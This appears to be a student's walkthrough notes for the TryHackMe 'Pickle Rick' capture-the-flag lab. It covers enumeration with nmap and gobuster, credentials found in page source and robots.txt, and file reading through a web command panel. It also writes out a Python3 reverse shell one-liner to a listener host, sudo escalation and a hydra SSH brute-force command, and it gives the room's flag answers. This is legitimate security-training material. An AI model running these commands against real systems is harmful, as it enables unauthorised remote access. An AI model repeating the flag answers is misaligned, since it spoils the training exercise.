#project

https://tryhackme.com/room/picklerick

Declarations:

1. IP: 10.10.128.67
2. Web App: https://10-10-128-67.p.thmlabs.com/

Questions:

1. What is the first ingredient Rick needs?
2. Whats the second ingredient Rick needs?
3. Whats the final ingredient Rick needs?

Method:

1. nmap Scan ``nmap -sC -sV -oN nmap/inital 10.10.252.198``
2. Browse the Webapp -> There is the Username ``R1ckRul3s`` as comment in the Sourceode
3. search directory ``gobuster dir -u https://10-10-252-198.p.thmlabs.com/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,sh,txt,cgi,html,js,css`` gives us 
	1. /assets
	2. /server-status
	3. /index.html
	4. /portal.php
	5. /robots.txt
4. Browse the findings. In the robots.txt we find ``Wubbalubbadubdub`` and in /portal.php we can login with ``R1ckRul3s`` and this as password
	1. using ``ls`` in the Commands Prompt we find the ``Sup3rS3cretPickl3Ingred.txt`` File. Using ``cat Sup3rS3cretPickl3Ingred.txt`` doesnt work. Using ``less Sup3rS3cretPickl3Ingred.txt`` gives us the first Ingredient: ``mr. meeseek hair``
	2. Using ``grep -R .`` and ``View Sourcecode`` we can see all of the files data
	3. Probing around like ``nc --version`` ``python --version`` ``python3 --version`` we get a hit with python3
	4. So we can create a Reverseshell using Python3. Copying the One Liner from Pentestmonkey and executing it ``python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.235.225",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`` we get access per SSH
	5. Browsing around again we find ``sudo su`` working and navigating to ``cd ~`` we find the 3rd Ingredient ``fleeb juice``
	6. The last Ingredient is hidden in ``/home/rick`` and can be accessed with ``cat *``


``hydra -t 4 -l R1ckRul3s -P /usr/share/wordlists/rockyou.txt -vV 10.10.252.198 ssh`` 
